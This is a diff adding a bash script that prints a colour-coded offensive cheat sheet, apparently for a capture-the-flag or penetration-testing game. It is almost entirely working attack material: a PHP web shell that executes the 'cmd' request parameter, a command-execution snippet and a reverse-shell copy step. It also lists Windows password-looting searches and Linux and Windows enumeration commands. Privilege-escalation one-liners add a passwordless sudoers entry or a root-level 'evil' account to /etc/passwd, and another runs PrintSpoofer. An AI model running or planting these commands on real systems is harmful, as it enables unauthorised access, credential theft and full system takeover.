@@ -1,0 +1,63 @@
+#!/bin/bash
+
+# display common commands that are needed during the game
+
+Frame='\033[0;32m'   # Green
+Link='\033[0;35m'  	 # Purple
+Title='\033[1;33m' 	 # Bold Yellow
+Comment='\033[0;36m' # Cyan
+End='\033[0m'		 # No Color
+Point='\033[0;31m[*]\033[0m'
+
+echo -e "${Frame}###${End} ${Title}Web Enum & Exploit${End} ${Frame}###${End}"
+echo -e "${Point} PHP backdoor"
+echo -e "<?php"
+echo -e "if(isset(\$_REQUEST['cmd'])){"
+echo -e "    echo \"<pre>\";"
+echo -e "    \$cmd = (\$_REQUEST['cmd']);"
+echo -e "    system(\$cmd);"
+echo -e "    echo \"</pre>\";"
+echo -e "    die;"
+echo -e "}"
+echo -e "?>"
+echo -e ""
+echo -e "${Point} PHP command execution script"
+echo -e "<?php passthru('id'); ?>"
+echo -e ""
+echo -e "${Point} PHP reverse shell"
+echo -e "cp /usr/share/webshells/php/php-reverse-shell.php ."
+echo -e ""
+
+
+
+
+
+echo -e "${Frame}###${End} ${Title}Linux Post Enum${End} ${Frame}###${End}"
+echo -e "${Point} ps aux | grep -i 'root' --color=auto ${Comment}# root processes${End}"
+echo -e "${Point} find / -perm -u=s -type f 2>/dev/null ${Comment}# SUID${End}"
+echo -e "${Point} find / -perm -g=s -type f 2>/dev/null ${Comment}# SGID${End}"
+echo -e ""
+
+
+
+echo -e "${Frame}###${End} ${Title}Windows Post Enum${End} ${Frame}###${End}"
+echo -e "${Point} systeminfo"
+echo -e "${Point} net users / net localgroups"
+echo -e "${Point} net user <user> / net group /domain [<group_name>]"
+echo -e "${Point} findstr /si password *.txt ${Comment}# password looting${End}"
+echo -e "${Point} dir /s *pass* == *cred* == *vnc* == *.config* ${Comment}# password looting${End}"
+echo -e "${Point} findstr /spin \"password\" *.* ${Comment}# find all passwords in all files.${End}"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Linux PrivEsc Oneliner${End} ${Frame}###${End}"
+echo -e "${Point} echo \"<user> ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
+echo -e "${Point} echo \"evil:\$(openssl passwd -1 evil):0:0:root:/root:/bin/bash\" >> /etc/passwd"
+echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Windows PrivEsc Oneliner${End} ${Frame}###${End}"
+echo -e "${Point} .\PrintSpoofer64.exe -i -c cmd ${Comment}# exploit 'SeImpersonatePrivilege'${End}"
+echo -e ""
+
+
